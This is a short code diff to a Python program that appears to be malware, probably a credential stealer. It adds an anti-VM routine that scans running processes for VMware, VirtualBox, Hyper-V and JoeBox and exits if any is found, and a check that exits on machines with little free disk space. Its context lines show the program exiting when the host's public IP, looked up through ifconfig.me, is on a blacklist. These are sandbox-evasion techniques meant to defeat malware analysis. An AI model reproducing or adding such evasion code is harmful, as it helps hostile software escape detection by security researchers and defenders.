@@ -19,7 +19,6 @@ import shutil
 import uuid
 import socket
 import getpass
-import requests
 import ctypes
 
 
@@ -61,6 +60,31 @@ ip = subprocess.check_output('curl ifconfig.me', shell=True).decode('utf-8').str
 if ip in sblacklist:
     exit()
 
+
+
+
+def antivm(self):
+    process_names = ["vmwareservice", "vmwaretray","joeboxcontrol","vmwareuser","vmware","virtualbox","hyperv"]
+    for name in process_names:
+        cmd = 'tasklist /FI "IMAGENAME eq {0}"'.format(name)
+        output = subprocess.check_output(cmd).decode()
+        if len(output.strip().split('\n')) > 1:
+            self.stop = True
+            os._exit(0)
+
+
+def disk(self):
+    minDiskSizeGB = 30
+    if len(sys.argv) > 1: 
+        minDiskSizeGB = float(sys.argv[1])
+    diskSizeBytes = shutil.disk_usage('.').free
+    diskSizeGB = diskSizeBytes/1024/1024/1024
+    if diskSizeGB < minDiskSizeGB:
+        try:
+            self.stop = True
+            os._exit(0)
+        except OSError:
+            pass
 
 DETECTED = False
 
